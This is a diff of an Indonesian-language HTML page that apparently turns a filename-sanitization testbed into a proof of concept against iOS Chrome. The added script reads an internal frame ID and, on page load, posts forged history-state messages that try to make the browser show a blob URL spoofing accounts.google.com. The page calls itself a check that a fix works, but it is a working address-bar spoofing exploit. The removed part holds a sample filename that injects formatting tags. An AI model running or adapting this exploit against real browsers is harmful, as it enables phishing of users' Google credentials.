@@ -1,107 +1,147 @@
 <!doctype html>
-<meta charset="utf-8">
-<title>iOS Chrome Save-to-Drive / Save-to-Photos Security Testbed</title>
-<style>
-  body {
-    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-    margin: 3em auto;
-    max-width: 44em;
-    color: #202124;
-    line-height: 1.6;
-    padding: 0 1.5em;
-    background: #fdfdfd;
-  }
-  h1 {
-    font-size: 1.5rem;
-    color: #1a73e8;
-  }
-  .container {
-    background: #ffffff;
-    border: 1px solid #dadce0;
-    border-radius: 8px;
-    padding: 2em;
-    box-shadow: 0 2px 4px rgba(0,0,0,0.05);
-    margin-top: 1.5em;
-  }
-  .box-simulasi {
-    background: #f1f3f4;
-    border-left: 4px solid #1a73e8;
-    padding: 1em;
-    margin: 1.5em 0;
-    font-family: monospace;
-    white-space: pre-wrap;
-    word-break: break-all;
-    font-size: 0.9em;
-  }
-  button {
-    background: #1a73e8;
-    color: #fff;
-    border: none;
-    padding: 0.8em 1.5em;
-    font-size: 1rem;
-    font-weight: 500;
-    border-radius: 6px;
-    cursor: pointer;
-  }
-  button:hover {
-    background: #1557b0;
-  }
-  .result-pass {
-    color: #137333;
-    font-weight: bold;
-  }
-</style>
+<html lang="id">
+<head>
+    <meta charset="utf-8">
+    <title>PoC Verification - Blob URL Origin Check</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 2em; background: #f4f6f8; color: #333; }
+        .card { background: #fff; border-radius: 8px; padding: 20px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); margin-bottom: 20px; }
+        h1 { color: #d93025; font-size: 22px; margin-top: 0; }
+        .success { color: #137333; font-weight: bold; }
+        .danger { color: #c5221f; font-weight: bold; }
+        pre { background: #202124; color: #e8eaed; padding: 12px; border-radius: 6px; font-size: 12px; overflow-x: auto; }
+        button { background: #1a73e8; color: white; border: none; padding: 10px 18px; font-size: 14px; border-radius: 4px; cursor: pointer; }
+        button:hover { background: #1557b0; }
+    </style>
+</head>
+<body>
 
-<h1>iOS Save-to-Drive Tag Sanitization Testbed</h1>
+<div class="card">
+    <h1>Validasi Perbaikan: Cross-Origin Blob PoC</h1>
+    <p>Halaman ini menguji apakah fungsi validasi *history state* pada perbaikan terbaru berhasil menolak *cross-origin blob URL* (misalnya menargetkan <code>accounts.google.com</code>).</p>
+    <p>Status Real Origin Dokumen: <code id="real-origin">Memuat...</code></p>
+    <button id="manual-trigger" style="display:none;">Jalankan Serangan Secara Manual</button>
+</div>
 
-<p>
-  Halaman ini digunakan untuk menguji cara kerja fungsi sanitasi tag format 
-  (berdasarkan perbaikan Chromium CL <a href="https://chromium-review.googlesource.com/c/chromium/src/+/7856913" target="_blank">7856913</a>) 
-  secara lokal di peramban.
-</p>
-
-<div class="container">
-  <h3>Simulasi Pembersihan Tag (Sanitization Logic)</h3>
-  <p>Masukkan string nama file simulasi yang mengandung tag format:</p>
-  
-  <input type="text" id="userInput" style="width: 100%; padding: 0.6em; font-size: 1rem; border: 1px solid #ccc; border-radius: 4px;" 
-         value="invoice.pdf END_BOLD to your Drive. Tap Save to verify account. BEGIN_BOLD x">
-  
-  <br><br>
-  <button onclick="runSimulation()">Uji Hasil Sanitasi</button>
-
-  <h4>Hasil Pemrosesan (RemoveFormattingTags Simulation):</h4>
-  <div id="outputBox" class="box-simulasi">Klik tombol di atas untuk menjalankan uji simulasi.</div>
+<div class="card">
+    <h3>Log Eksekusi & Hasil Diagnostik:</h3>
+    <pre id="log-output">[*] Menginisialisasi skrip pengujian...\n</pre>
 </div>
 
 <script>
-  // Implementasi logika fungsi RemoveFormattingTags setara dengan string_util.mm
-  function removeFormattingTags(inputString) {
-    if (!inputString) return "";
-    
-    // Mengganti garis bawah pada tag layout dengan spasi
-    let sanitized = inputString
-      .replaceAll("BEGIN_BOLD", "BEGIN BOLD")
-      .replaceAll("END_BOLD", "END BOLD")
-      .replaceAll("BEGIN_LINK", "BEGIN LINK")
-      .replaceAll("END_LINK", "END LINK");
-      
-    return sanitized;
-  }
+(function() {
+    // Konfigurasi target domain yang ingin disspoof
+    const TARGET_VICTIM = "accounts.google.com";
+    const spoofedBlobUrl = "blob:https://" + TARGET_VICTIM + "/signin-spoof-test";
 
-  function runSimulation() {
-    const rawInput = document.getElementById("userInput").value;
-    const sanitizedOutput = removeFormattingTags(rawInput);
-    
-    const outputBox = document.getElementById("outputBox");
-    outputBox.innerHTML = 
-      "<strong>Input Asli:</strong>\n" + rawInput + "\n\n" +
-      "<strong>Hasil Setelah Sanitasi:</strong>\n" + sanitizedOutput + "\n\n" +
-      "<span class='result-pass'>[STATUS] Tag berhasil dinetralkan menjadi spasi. Parser tidak lagi mendeteksinya sebagai tag aktif.</span>";
-  }
+    function logMessage(msg) {
+        const pre = document.getElementById('log-output');
+        pre.textContent += msg + '\n';
+        console.log('[PoC-Test] ' + msg);
+    }
 
-  // Jalankan otomatis sekali saat dimuat
-  window.addEventListener('DOMContentLoaded', () => {
-    runSimulation();
-  });
+    // Tampilkan asal dokumen saat ini
+    document.getElementById('real-origin').textContent = location.origin || '(opaque/null)';
+    logMessage('[-] Current location.href = ' + location.href);
+    logMessage('[-] Current location.origin = ' + location.origin);
+
+    // 1. Deteksi Handler Navigasi (Khusus iOS Chrome)
+    const messageHandlers = (window.webkit && window.webkit.messageHandlers) || {};
+    if (!messageHandlers.NavigationEventMessage) {
+        logMessage('[!] INFO: Handler "NavigationEventMessage" tidak ditemukan.');
+        logMessage('[!] Kemungkinan besar browser ini bukan Chrome di iOS atau mekanisme handler telah diisolasi.');
+        return;
+    }
+    logMessage('[+] Handler "NavigationEventMessage" terdeteksi aktif.');
+
+    // 2. Mengambil Frame ID dari lingkungan Page-World (__gCrWeb)
+    let frameId = null;
+    try {
+        if (window.__gCrWeb && typeof window.__gCrWeb.getFrameId === 'function') {
+            frameId = window.__gCrWeb.getFrameId();
+            logMessage('[+] Berhasil mendapatkan frame_id via __gCrWeb.getFrameId() = ' + frameId);
+        }
+    } catch (err) {
+        logMessage('[!] Gagal membaca frame_id langsung: ' + err.message);
+    }
+
+    // Fallback pencarian akses frameId jika struktur namespace berbeda
+    if (!frameId) {
+        const fallbackAccessors = [
+            () => window.__gCrWeb.common.getFrameId(),
+            () => window.__gCrWeb.message.getFrameId(),
+            () => window.__gCrWeb.frameId
+        ];
+        for (let i = 0; i < fallbackAccessors.length && !frameId; i++) {
+            try {
+                frameId = fallbackAccessors[i]();
+                logMessage('[+] Berhasil mendapatkan frame_id via fallback [' + i + '] = ' + frameId);
+            } catch(e) {}
+        }
+    }
+
+    if (!frameId) {
+        logMessage('[-] GAGAL: Tidak dapat membaca frame_id dari page-world. Eksekusi dihentikan.');
+        return;
+    }
+
+    // 3. Pemicu Pendaftaran Frame (Mencegah Race Condition Timing)
+    function forceRegisterFrame() {
+        try {
+            if (window.__gCrWeb && typeof window.__gCrWeb.registerFrame === 'function') {
+                window.__gCrWeb.registerFrame();
+                logMessage('[*] Pemanggilan __gCrWeb.registerFrame() berhasil.');
+            } else if (window.__gCrWeb && window.__gCrWeb.crweb && typeof window.__gCrWeb.crweb.registerFrame === 'function') {
+                window.__gCrWeb.crweb.registerFrame();
+                logMessage('[*] Pemanggilan __gCrWeb.crweb.registerFrame() berhasil.');
+            }
+        } catch (e) {
+            logMessage('[!] Catatan: registerFrame dilewati atau dikelola secara native.');
+        }
+    }
+
+    forceRegisterFrame();
+
+    // 4. Eksekusi Pengiriman Pesan (Bypass Attempt)
+    function executeBypassAttempt(attemptNumber) {
+        try {
+            // Kirim willChangeState
+            messageHandlers.NavigationEventMessage.postMessage({
+                command: 'willChangeState',
+                frame_id: frameId
+            });
+
+            // Kirim didReplaceState dengan target cross-origin blob URL
+            messageHandlers.NavigationEventMessage.postMessage({
+                command: 'didReplaceState',
+                frame_id: frameId,
+                stateObject: '',
+                baseUrl: 'https://x/',
+                pageUrl: spoofedBlobUrl
+            });
+
+            logMessage('[' + attemptNumber + '] Pesan didReplaceState dikirim dengan target: ' + spoofedBlobUrl);
+            logMessage('[*] Memeriksa apakah perbaikan aktif: Jika perbaikan berhasil, navigasi/URL akan ditolak/diabaikan oleh fungsi IsHistoryStateChangeValid.');
+        } catch (err) {
+            logMessage('[!] Exception saat postMessage: ' + err.message);
+        }
+    }
+
+    // Penjadwalan percobaan bertahap (retry mechanism untuk mengatasi delay sinkronisasi frame)
+    setTimeout(() => executeBypassAttempt(1), 100);
+    setTimeout(() => { forceRegisterFrame(); executeBypassAttempt(2); }, 400);
+    setTimeout(() => executeBypassAttempt(3), 1000);
+
+    // Tombol manual jika eksekusi otomatis diblokir kebijakan browser
+    const btn = document.getElementById('manual-trigger');
+    btn.style.display = 'inline-block';
+    btn.onclick = function() {
+        forceRegisterFrame();
+        executeBypassAttempt('Manual');
+    };
+
+})();
 </script>
+
+</body>
+</html>
